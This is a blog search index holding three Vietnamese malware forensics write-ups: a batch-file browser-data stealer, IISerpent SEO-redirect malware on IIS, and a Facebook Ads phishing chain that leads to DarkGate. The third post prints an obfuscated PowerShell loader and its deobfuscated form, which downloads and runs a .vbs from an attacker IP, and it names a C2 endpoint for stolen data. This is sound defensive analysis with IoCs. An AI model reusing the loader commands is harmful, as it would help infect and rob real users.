<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Phishing tấn công người dùng Windows</title>
      <link href="/2023/11/22/Phishing-tancongnguoidungwindows/"/>
      <url>/2023/11/22/Phishing-tancongnguoidungwindows/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Thong-tin-ban-dau"><a href="#1-Thong-tin-ban-dau" class="headerlink" title="1. Thông tin ban đầu"></a>1. Thông tin ban đầu</h2><p>Gần đây, có một chiến dịch lừa đảo tấn công sử dụng người dùng Windows.<br><img src="/../images/Phishing-tancongnguoidungwindows/mess.PNG"></p><h2 id="2-Phan-tich"><a href="#2-Phan-tich" class="headerlink" title="2. Phân tích"></a>2. Phân tích</h2><h3 id="2-1-So-bo"><a href="#2-1-So-bo" class="headerlink" title="2.1. Sơ bộ"></a>2.1. Sơ bộ</h3><p>Kiểm tra ban đầu, qua cái tên cũng biết được file <code>bat</code> nằm trong tệp <code>zip</code>.<br><img src="/../images/Phishing-tancongnguoidungwindows/check1.PNG"><br>Mẫu này có người kiểm tra trên virustotal 12 ngày trước.<br><img src="/../images/Phishing-tancongnguoidungwindows/check2.PNG"></p><h3 id="2-2-Kiem-tra-chi-tiet"><a href="#2-2-Kiem-tra-chi-tiet" class="headerlink" title="2.2. Kiểm tra chi tiết"></a>2.2. Kiểm tra chi tiết</h3><p>Nhìn qua thì tệp file <code>bat</code> này được obfuscate.<br><img src="/../images/Phishing-tancongnguoidungwindows/check3.PNG"></p><ul><li><p>Tên biến và hàm lạ lùng</p></li><li><p>Ký tự không đọc được<br>Quá trình deobfuscate thì đây chính là nội dung của file <code>bat</code><br><img src="/../images/Phishing-tancongnguoidungwindows/check4.PNG"><br>Quá trình như sau:</p></li></ul><ol><li><p>Khởi động chorme truy vấn đến website: <a href="https://vuahanghieu[.]com/nuoc-hoa-dior-sauvage-eau-de-toilette-cho-nam-100ml-ph008734?tr=">https://vuahanghieu[.]com/nuoc-hoa-dior-sauvage-eau-de-toilette-cho-nam-100ml-ph008734?tr=</a></p></li><li><p>Đưa file bat vào thư mục Startup để khi khởi động lại máy tính sẽ thực hiện khởi chạy file độc hại này. <code>&quot;C:\\Users\\$UserName\\AppData\\Roaming\\Microsoft\\Windows\\&#39;StartMenu&#39;\\Programs\\Startup\\WindowsSecure.bat&quot;</code> . </p></li><li><p>Khai báo một số biến môi trường</p></li><li><p>Kết nối website <a href="https://school-us[.]store/">https://school-us[.]store/</a> để tải file <code>achung2.zip</code> và giải nén vào thư mục <code>OutFileC:\\Users\\Public\\Windown.zip</code>. Ngày đăng ký domain:17-10-2023</p></li><li><p>Chạy chương trình <code>project.py</code></p></li></ol><p><code>achung2.zip</code> là thư mục chứa thư viện <code>python</code> sử dụng để khởi chạy chương trình <code>project.py</code><br>Nội dung của <code>project.py</code> như sau:</p><p><img src="/../images/Phishing-tancongnguoidungwindows/check6.PNG"></p><p>Đại loại đây là chương trình đánh cắp dữ liệu từ các trình duyệt người dùng Chorme, FireFox, Coccoc, Edge, … vị trí nạn nhân, gửi xóa dữ liệu của người dùng.<br>Các dữ liệu được gửi một bot của ứng dụng Telegram<br><img src="/../images/Phishing-tancongnguoidungwindows/check7.PNG"></p><p>Rồi sau đó thực hiện xóa các dấu vết trên máy tính.<br><img src="/../images/Phishing-tancongnguoidungwindows/check8.PNG"></p><h2 id="3-Ket-luan"><a href="#3-Ket-luan" class="headerlink" title="3. Kết luận"></a>3. Kết luận</h2><p>Mã độc này khá dễ phát hiện, tuy nhiên nó cũng cực kỳ khó chịu khi lấy dữ liệu người dùng.</p><p>Trường hợp máy tính bị nhiễm cần kiểm tra và gỡ bỏ file <code>bat</code> trong thư mục Startup.</p><p>Thay đổi mật khẩu, cookie, token, autofill các website lưu trữ trên trình duyệt.</p><h2 id="4-IoCs"><a href="#4-IoCs" class="headerlink" title="4. IoCs"></a>4. IoCs</h2><p>Domain</p><p><a href="https://vuahanghieu[.]com/nuoc-hoa-dior-sauvage-eau-de-toilette-cho-nam-100ml-ph008734?tr=">https://vuahanghieu[.]com/nuoc-hoa-dior-sauvage-eau-de-toilette-cho-nam-100ml-ph008734?tr=</a><br><a href="https://school-us[.]store/">https://school-us[.]store/</a></p><p>IP</p><p>104[.]21[.]41[.]5</p><p>File</p><p>SHA256:<br><code>mal.bat</code>:<br>7859f8ac3a70b2e9c73c86aa70d23bdb680179f67057b8d5f05db99266a9b53f</p><p>Folder<br><code>C:\\Users\\Public\\Windown.zip</code><br><code>C:\\Users\\$UserName\\AppData\\Roaming\\Microsoft\\Windows\\&#39;StartMenu&#39;\\Programs\\Startup\\WindowsSecure.bat</code></p><h2 id="Shout-out"><a href="#Shout-out" class="headerlink" title="Shout-out"></a>Shout-out</h2><p>Cảm ơn NexO giới thiệu 1 người bạn có phát hiện <a href="https://vmtien.id.vn/ben-trong-ma-doc-danh-cap-tai-khoan-mang-xa-hoi-co-gi/?fbclid=IwAR3AAxl_PRSNI6-BUOi_WGah4fAYxgKkYFXkxvIohF-4vg51Llo9g3Y5SnI">tương tự</a>. Chi tiết mã nguồn có trong bài viết này. Mẫu này chỉ thay đổi bot telegram nhận thông tin và chỉnh sửa một phần mã python.</p><p><em><strong>Bản kiểm điểm</strong></em>: Lần đầu tiên mình đã không tuân thủ chính sách, trong quá trình viết blog trên thiết bị mới, đã vô tình khởi chạy mã độc.</p><blockquote><p>Giọt nước mắt cuốn ký ức chìm sâu, đừng làm nhau đau</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Forensics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phishing </tag>
            
            <tag> windows </tag>
            
            <tag> bat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tấn công chuyển hướng website cờ bạc, cá độ</title>
      <link href="/2023/10/21/Tan-cong-chuyen-huong-website-IIS/"/>
      <url>/2023/10/21/Tan-cong-chuyen-huong-website-IIS/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Thong-tin-ban-dau"><a href="#1-Thong-tin-ban-dau" class="headerlink" title="1. Thông tin ban đầu"></a>1. Thông tin ban đầu</h2><p>Năm 2022 - 2023, các website Cổng thông tin điện tử tại Việt Nam hầu hết bị tấn công bởi mã độc khiến chuyển hướng đến các website cờ bạc.<br><img src="/../images/Tan-cong-chuyen-huong-website-IIS/check1.PNG"><br>Thông qua tìm kiếm trên google, các kết quả trả về sẽ chuyển hướng 404 rồi sang website cá độ, cờ bạc.</p><p>Search Engine Optimization (SEO) - Tối ưu hóa công cụ tìm kiếm là quá trình tăng chất lượng và lưu<br>lượng truy cập website bằng cách tăng khả năng hiển thị của website hoặc webpage cho người dùng<br>trên các máy truy tìm dữ liệu như Google</p><p>Tìm kiếm trên công cụ google với các từ khóa liên quan đến cá độ, cờ bạc, với tùy chọn là trang tên miền chứa gov.vn, edu.vn người dùng có thể dễ dàng nhìn thấy nhiều trang có đuôi tên miền *.gov.vn của các cơ quan nhà nước đã bị tấn công “hack” và chèn các đường link quảng cáo, dòng mã độc IISerpent.<br>    IISerpent được triển khai và định cấu hình dưới dạng tiện ích mở rộng độc hại cho IIS – phần mềm máy chủ web của Microsoft. Điều đó cho phép phần mềm độc hại chặn tất cả các yêu cầu HTTP được gửi đến các trang web được lưu trữ bởi máy chủ bị xâm nhập, đồng thời chủ động thay đổi phản hồi HTTP của máy chủ.<br>     Các công cụ tìm kiếm thường xuyên thu thập thông tin trên internet, sau đó lập chỉ mục tất cả nội dung được tìm thấy trực tuyến, xây dựng mối liên hệ giữa cụm từ tìm kiếm và nội dung, đồng thời sử dụng nhiều thuật toán khác nhau để tính toán thứ hạng của kết quả cho các cụm từ tìm kiếm cụ thể.<br>    Khi truy cập vào website như bình thường, nó sẽ lập tức chuyển hướng sang bên thứ 3, các nội dung website này bao gồm cờ bạc, khiêu dâm, …</p><h2 id="2-Mot-loai-ma-doc-tren-he-thong"><a href="#2-Mot-loai-ma-doc-tren-he-thong" class="headerlink" title="2. Một loại mã độc trên hệ thống"></a>2. Một loại mã độc trên hệ thống</h2><p>Ngoài những việc thay đổi <code>config</code> để load một số module trên IIS Server, dưới đây là một số cách loại mã độc này thực hiện.</p><h3 id="2-1-Persistence-Mechanism"><a href="#2-1-Persistence-Mechanism" class="headerlink" title="2.1. Persistence Mechanism"></a>2.1. Persistence Mechanism</h3><p><img src="/../images/Tan-cong-chuyen-huong-website-IIS/check2.PNG"><br>Mã độc duy trì hoạt động trong Windows Service với tham số là một tệp dll độc hại tại <code>C:\\Windows\System32\wpdbusenum.dll</code>. Tệp wpdbusenum.dll đóng vai trò tạo các tệp SEO dll.</p><p>Các tệp độc hại :<br><code>C:\Windows\Logs\CBS\API.log</code><br><code>C:\Windows\Logs\CBS\ART.log</code><br><code>C:\ProgramData\Microsoft\Network\apicgi.dll</code><br><code>C:\ProgramData\Microsoft\Network\apifastcgi.dll</code></p><p>Tiến trình <code>cmd</code> fake thực hiện copy nội dung vào <code>apicgi.dll</code></p><p>Tiến hành đóng dịch vụ IIS, stop service độc hại đang chạy.</p><h3 id="2-2-Ma-doc-duoc-goi-qua-config-file"><a href="#2-2-Ma-doc-duoc-goi-qua-config-file" class="headerlink" title="2.2. Mã độc được gọi qua config file"></a>2.2. Mã độc được gọi qua config file</h3><p>Khi nhận thấy website chuyển hướng đến link cố định, ở đây là <code>baidu.*</code>, file mã độc không obfuscate domain, nên sử dụng rule tìm kiếm để tiết kiệm thời gian.<br>Tiến hành kiểm tra trong thư mục <code>system32</code>.</p><p>yara rule</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  Rule scan &#123;</span><br><span class="line">Strings: </span><br><span class="line">$a = &quot;baidu&quot;</span><br><span class="line">Condition:</span><br><span class="line">$a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yara64.exe .\rulescan.txt -r C:\Windows\System32\inetsrv\</span><br></pre></td></tr></table></figure><p>Trường hợp thấy <code>.dll</code> được load, tiến hành dừng dịch vụ IIS.<br>Xóa dòng load Dll trong file config :<br><code>C:\Windows\System32\inetsrv\config\applicatitonHost.config</code><br>Xóa file dll <code>C:\Windows\System32\inetsrv</code></p><h2 id="3-Khac-phuc"><a href="#3-Khac-phuc" class="headerlink" title="3. Khắc phục"></a>3. Khắc phục</h2><h3 id="3-1-Nguyen-nhan-tan-cong"><a href="#3-1-Nguyen-nhan-tan-cong" class="headerlink" title="3.1. Nguyên nhân tấn công"></a>3.1. Nguyên nhân tấn công</h3><p>Với mỗi hệ thống, lại có một nguyên nhân tấn công khác nhau.<br>Về cơ bản, các hệ thống cổng thông tin điện tử có một số lỗ hổng phổ biến như phiên bản Telerik có lỗ hổng: CVE-2019-18935, CVE-2017-11317<br><img src="/../images/Tan-cong-chuyen-huong-website-IIS/check3.png"><br>Poc cho các lỗ hổng này có sẵn.</p><p>Các file upload không kiểm duyệt đuôi file <code>.ashx</code> dẫn đến thực thi webshell.</p><p>Và rất nhiều lỗ hổng khác mà mình chưa rõ thông tin.</p><h3 id="3-2-Xoa-cache-google"><a href="#3-2-Xoa-cache-google" class="headerlink" title="3.2. Xóa cache google"></a>3.2. Xóa cache google</h3><p>Vì khi tìm kiếm Google sẽ hiện lên các website cờ bạc, cá độ, cần report cho Google gỡ các kết quả tìm kiếm này.<br>Thực hiện xóa cache Google theo hưởng dẫn được mô tả chi tiết:<br>Bước 1: Truy cập  Google Search Console và đăng nhấp<br>Bước 2: Chọn nhập tiền tố URL và nhấn tiếp tục<br>Bước 3: Thực hiện xác minh chủ sỡ hữu domain<br>Bước 4: Nhấn xóa sản phẩm<br>Hướng dẫn chi tiết trong hai bài viết sau.<br><a href="https://passwordprotectwp.com/remove-private-content-google-cache/#:~:text=Remove%20your%20Cached%20Pages%20with%20Google%20Search%20Console&text=In%20the%20%E2%80%9CIndex%E2%80%9D%20menu%2C,option%20and%20submit%20your%20request">Remove private content Google cache</a></p><p><a href="https://www.youtube.com/watch?v=h223mCgbmf4">Remove in Search console</a></p><h2 id="4-IoCs"><a href="#4-IoCs" class="headerlink" title="4. IoCs"></a>4. IoCs</h2><p>SHA256<br><code>apicgi.dll</code>: 08f965f640a3ec1c3aa9c31033455fad02550485d0d5b6fe33553d374775f18a</p><p><code>apifastcgi.dll</code>: bf45c48b209e5004520b5d541e406c183bccb2fe81f3974c2c53be48017f74ca</p><p><code>wpdbusenum.dll</code>: aa9efe49bf7846c5f805f077f0d0bf9f0e1e7758fafd9bcf9984d6fc4c20892a</p><h2 id="Shout-out"><a href="#Shout-out" class="headerlink" title="Shout-out"></a>Shout-out</h2><p>Cảm ơn DieuPX.</p>]]></content>
      
      
      <categories>
          
          <category> Forensics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> IIS </tag>
            
            <tag> IISerpent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tấn công người dùng làm dịch vụ Facebook Ads</title>
      <link href="/2023/10/05/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/"/>
      <url>/2023/10/05/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Thong-tin-ban-dau"><a href="#1-Thong-tin-ban-dau" class="headerlink" title="1. Thông tin ban đầu"></a>1. Thông tin ban đầu</h1><p>Nửa đêm, bạn bè gọi liên quan đến một cuộc phishing máy PC cá nhân.</p><p><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check1.PNG"></p><h1 id="2-Phan-tich"><a href="#2-Phan-tich" class="headerlink" title="2. Phân tích"></a>2. Phân tích</h1><p>Website nạn nhân đã click vào, có một thông báo nếu người dùng chấp nhận click vào sẽ thực hiện lệnh <code>javascript</code>.</p><p><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/website.png"></p><p>View page source ta có thể thấy đường dẫn file ChungLG.js “đáng ngờ”. Sau đó thông qua <code>search-ms</code> đẫn người dùng truy cập đến địa chỉ <code>194.87.31.108:8080</code> để thực hiện tải file độc hại.<br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check_bs2.PNG"></p><p>File zip độc hại như sau<br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check4.PNG"><br>Đây là 2 file shortcut giả dạng PDF và Excel.</p><p>Nếu không để ý click vào thì khởi động powershell.<br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check5.PNG"></p><p>Lệnh như sau:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = $env:TEMP + &#x27;\ldOGUevTtt.pdf&#x27;;$secondPath=$env:TEMP+&#x27;\HYFmFrcWvQ.vbs&#x27;;$pHqgh=&#x27;&#x27;;$pHqgh+=&#x27;Invoke-WebRe&#x27;;$WJNzC=690;$pHqgh+=&#x27;quest -Uri &quot;&#x27;;$pHqgh+=&#x27;http://89.23&#x27;;$pHqgh+=&#x27;.100.222:80/&#x27;;$pHqgh+=&#x27;foo/neverban&#x27;;$TjHvT=9796;$pHqgh+=&#x27;_SUCBAm.vbs&quot;&#x27;;$pHqgh+=&#x27; -OutFile $s&#x27;;$pHqgh+=&#x27;econdPath;St&#x27;;$pHqgh+=&#x27;art-Process &#x27;;$TzMnd= $WJNzC+ $WJNzC;$pHqgh+=&#x27;-FilePath $s&#x27;;$pHqgh+=&#x27;econdPath;In&#x27;;$pHqgh+=&#x27;voke-WebRequ&#x27;;$pHqgh+=&#x27;est -Uri &quot;ht&#x27;;$RZjYx=167;$pHqgh+=&#x27;tps://files.&#x27;;$pHqgh+=&#x27;catbox.moe/b&#x27;;$pHqgh+=&#x27;8bf3x.pdf&quot; -&#x27;;$pHqgh+=&#x27;OutFile $pat&#x27;;$yJYYz=9737;$pHqgh+=&#x27;h;Start-Proc&#x27;;$pHqgh+=&#x27;ess -FilePat&#x27;;$pHqgh+=&#x27;h $path;&#x27;;.([char](21*5) + [char](51+50) + [char](20*6)) $pHqgh;</span><br></pre></td></tr></table></figure><p>Thực hiện deobfuscation đoạn powershell script thu được:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri &quot;http://89.23.100.222:80/foo/neverban_SUCBAm.vbs&quot; -OutFile $secondPath;</span><br><span class="line">Start-Process -FilePath $secondPath;</span><br><span class="line">Invoke-WebRequest -Uri &quot;https://files.catbox.moe/b8bf3x.pdf&quot; -OutFile $path;</span><br><span class="line">Start-Process -FilePath $path;</span><br></pre></td></tr></table></figure><p>Khi đoạn powershell được thực thi download và lưu file nerverba_SUCBAm.vbs lưu tại $path &#x3D; $env:TEMP</p><p>Nội dung file <code>.vbs</code><br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check6.PNG"><br>Đoạn mã này thực hiện lấy tất cả các tiến trình trên máy tính nạn nhân rồi gửi về server <code>http://vntricker.abcxzy.com:2351/nlhsapgv</code> và sau đó nhận phản hồi qua đoạn message.<br>Nội dung của đoạn mesage được làm rối khi gửi lên thì nhận về nội dung như sau.</p><p><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/response.png"></p><p>Lệnh hình trên với chức năng tải tệp thực thi Autoit.exe và tệp autoit script(.au3) độc hại và thực thi nó.</p><p>Nội dụng file autoscript độc hại sau khi trích xuất:<br>Thực hiện deobfuscation đoạn  thu được:<br><img src="/../images/Tan-cong-nguoi-dung-dich-vu-Facebook-Ads/check_bs1.PNG"></p><p>Ban đầu tưởng file này bình thường, hóa ra rất là phức tạp, blog <a href="https://0xtoxin.github.io/threat%20breakdown/DarkGate-Camapign-Analysis/">mô tả chi tiết</a> liên quan đến mã độc này.</p><h1 id="3-Khac-phuc"><a href="#3-Khac-phuc" class="headerlink" title="3. Khắc phục"></a>3. Khắc phục</h1><p>Gỡ toàn bộ file zip, vbs, ..</p><p>Các tiến trình chạy trong hệ thống.</p><h1 id="4-IoCs"><a href="#4-IoCs" class="headerlink" title="4. IoCs"></a>4. IoCs</h1><p>Domain:<br><a href="https://lingiangcosmetic[.]com/quotation">https://lingiangcosmetic[.]com/quotation</a><br><a href="https://files[.]catbox[.]moe">https://files[.]catbox[.]moe</a><br><a href="http://vntricker[.]abcxzy[.]com:2351">http://vntricker[.]abcxzy[.]com:2351</a></p><p>SHA256:<br><code>Lingiang_..._2023.zip</code>:<br>8ff7faad4b645852b54c7be621264b8b1a2d97c14119d45dd27d7f69c272272f</p><p><code>SUCBAm.vbs</code>:<br>1fedd78764fa7c35d5b43b1a9e7111dfa318d3a751e3a819d9d0cc75b69403a0</p><p><code>Cosmetic-...-09-2023</code>:<br>64dd55e1c2373deed25c2776f553c632e58c45e56a0e4639dfd54ee97eab9c19</p><p><code>Lingiang_.._Brief_2023</code>:<br>64dd55e1c2373deed25c2776f553c632e58c45e56a0e4639dfd54ee97eab9c19</p><p>IP:<br>89[.]23[.]100[.]222<br>194[.]87[.]31[.]108</p><h2 id="Shout-out"><a href="#Shout-out" class="headerlink" title="Shout-out"></a>Shout-out</h2><p>Cảm ơn DuongHC.</p>]]></content>
      
      
      <categories>
          
          <category> Forensics </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phishing </tag>
            
            <tag> windows </tag>
            
            <tag> Ink </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
